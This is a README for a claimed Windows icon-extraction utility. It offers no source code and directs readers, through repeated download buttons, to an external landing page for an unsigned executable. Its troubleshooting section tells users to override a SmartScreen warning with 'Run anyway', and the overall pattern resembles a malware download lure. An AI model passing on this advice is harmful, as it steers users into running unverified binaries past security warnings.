<div align="center">

<img src="assets/banner.svg" width="100%" alt="Icon Extractor banner"/>

# icon-extractor-tool 🧩🔍

![Version](https://img.shields.io/badge/version-2026-blue?style=for-the-badge) ![Windows](https://img.shields.io/badge/platform-Windows-0078d4?style=for-the-badge&logo=windows&logoColor=white) ![License](https://img.shields.io/badge/license-MIT-green?style=for-the-badge)

*Pull every icon buried inside an .exe, .dll, or .ico — in seconds, at full resolution.*

<p align="center">
  <a href="https://ThornConureCanopy.github.io/icon-extractor-tool/">
    <img src="https://img.shields.io/badge/GET-Icon_Extractor_2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>
</p>
</div>

---

## 📖 Overview

Windows binaries hoard icons. A single `.exe` can carry a dozen resolutions, multiple color depths, and legacy 16-color fallbacks — all compiled into a resource table most tools never fully expose. **icon-extractor-tool** was built to open that table properly: no guessing, no lossy re-renders, no "just grab the 32x32 and call it done." It reads the PE resource directory directly and pulls every icon group exactly as the original developer packaged it.

This exists because icon extraction is a recurring, unglamorous problem — developers rebranding a tool, archivists preserving old software, designers mining icon packs for inspiration, or IT admins auditing what's actually shipped inside a legacy binary. Most existing solutions either mangle transparency, cap resolution at 256x256, or bury the feature behind a bloated "system utility" suite. This tool does one thing — icon extraction — and does it at the resource level, not the pixel level.

Built for Windows 10/11, it's aimed at developers, reverse-engineering hobbyists, digital archivists, and UI designers who need clean, source-accurate icon assets without babysitting a converter chain. No cloud upload, no telemetry, no dependency chain to manage.

## 🚀 Get Started

<p align="center">

<a href="https://ThornConureCanopy.github.io/icon-extractor-tool/">
    <img src="https://img.shields.io/badge/GET-Icon_Extractor_2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>

---

## 📋 Requirements

| Component | Minimum |
|---|---|
| OS | Windows 10 (64-bit) / Windows 11 |
| Disk | 40 MB free |
| RAM | 256 MB |
| Dependencies | None — standalone executable |
| .NET / runtime | Not required |
| Admin rights | Not required for standard use |

> [!NOTE]
> No installer, no background service, no runtime to fetch. Download, run, extract.

## ⚙️ What It Actually Does

- **Resource-table parsing** — reads the PE `RT_GROUP_ICON` and `RT_ICON` entries directly, so every embedded size and color depth is captured, not just the one Explorer shows you.
- **Batch extraction** — point it at a folder of `.exe`/`.dll` files and pull icons from all of them in one pass, instead of opening each binary manually.
- **Multi-format export** — save as `.ico`, `.png`, or `.bmp` depending on whether you need the container format or a flat raster asset.
- **Resolution-aware output** — every embedded size (16x16 up through 256x256, including high-DPI variants) is exported separately, never resampled.
- **Transparency preservation** — alpha channels and legacy AND-masks are both handled correctly, so exported PNGs don't get the dreaded black-fringe halo.
- **Drag-and-drop workflow** — drop a file onto the window and extraction starts immediately, no menu-diving required.
- **Preview grid** — see every icon variant side-by-side before exporting, so you export only what you need.
- **Zero footprint** — a single portable executable; nothing written to the registry, nothing installed system-wide.

## 🖱️ How to Begin

1. Open the landing page via the download button above.
2. Download the standalone executable — no installer wizard.
3. Run it directly; Windows may show a SmartScreen prompt on first launch (see Troubleshooting).
4. Drag in an `.exe`, `.dll`, or `.ico` file and export the icons you want.

> [!TIP]
> Extracting from system files? Copy the binary to a working folder first — some system paths are read-locked even for extraction-only access.

## 🧠 How It Works

The extraction pipeline is deliberately shallow — fewer moving parts means fewer failure points:

1. **Load** — the target binary is opened in read-only mode; nothing is modified on disk.
2. **Parse** — the PE header is walked to locate the resource directory.
3. **Index** — every `RT_GROUP_ICON` entry is mapped to its child `RT_ICON` frames.
4. **Render** — frames are decoded to their native bit depth (no forced resampling).
5. **Export** — you choose format and destination; files are written with source-accurate naming.

```mermaid
flowchart LR
    Load --> Parse
    Parse --> Index
    Index --> Render
    Render --> Export
```

## 🛟 Troubleshooting

**Q: Windows SmartScreen flagged the download — is that expected?**
A: Yes, for new/unsigned portable executables. It's not malicious; click "More info" → "Run anyway" if you trust the source.

**Q: I extracted icons but some are missing sizes I saw in Explorer.**
A: Explorer sometimes caches a rendered thumbnail that isn't a native resource entry. The tool only exports what's actually embedded in the binary.

**Q: The exported PNG has a weird dark edge around transparent areas.**
A: That indicates the source icon used a legacy AND-mask instead of a true alpha channel — the tool preserves it faithfully rather than faking a clean edge.

**Q: Can it extract icons from a running process, not just a file on disk?**
A: No — it works on files, not live memory. Point it at the binary path instead.

**Q: Batch mode skipped a file in the folder.**
A: Likely a corrupted resource table or a binary with no icon resources at all (common for CLI-only tools).

**Q: Does it need internet access to run?**
A: No. Extraction is fully local; the only network call is loading the landing page to download it.

## 🎛️ Interface & Controls

| Action | Shortcut |
|---|---|
| Open file | `Ctrl + O` |
| Export selected | `Ctrl + E` |
| Export all | `Ctrl + Shift + E` |
| Toggle preview grid size | `Ctrl + G` |
| Toggle dark/light theme | `Ctrl + T` |

<details>
<summary><strong>Theming & display options</strong></summary>

- Dark and light themes, switchable instantly, no restart required.
- Preview grid supports thumbnail zoom for inspecting small icon sizes (16x16, 24x24) without squinting.
- Export naming pattern is configurable (`{filename}_{size}.{ext}` by default).

</details>

> [!IMPORTANT]
> Batch exports write into a subfolder named after the source binary — this prevents accidental overwrites when processing multiple files with overlapping icon sizes.

## 🤝 Contributing & Community

Bug reports, edge-case binaries that break parsing, and UI feedback are all welcome via Issues. This project favors *small, focused* pull requests over sweeping rewrites — the extraction core stays intentionally minimal.

> [!WARNING]
> Do not submit binaries you don't have rights to redistribute when filing bug reports. Describe the resource structure instead, or use a sample you can legally share.

---

## 📜 License

Released under the [MIT License](LICENSE), 2026.

## ⚠️ Disclaimer

This tool reads and exports icon resources already embedded in files you choose to open. You are responsible for respecting the copyright and licensing terms of any binary you extract from. This project is provided "as is," with no warranty of any kind.

---

<p align="center">

<a href="https://ThornConureCanopy.github.io/icon-extractor-tool/">
    <img src="https://img.shields.io/badge/GET-Icon_Extractor_2026-4338CA?style=for-the-badge&logo=windows&logoColor=white&labelColor=3730A3" width="550" alt="Download"/>
  </a>

</p>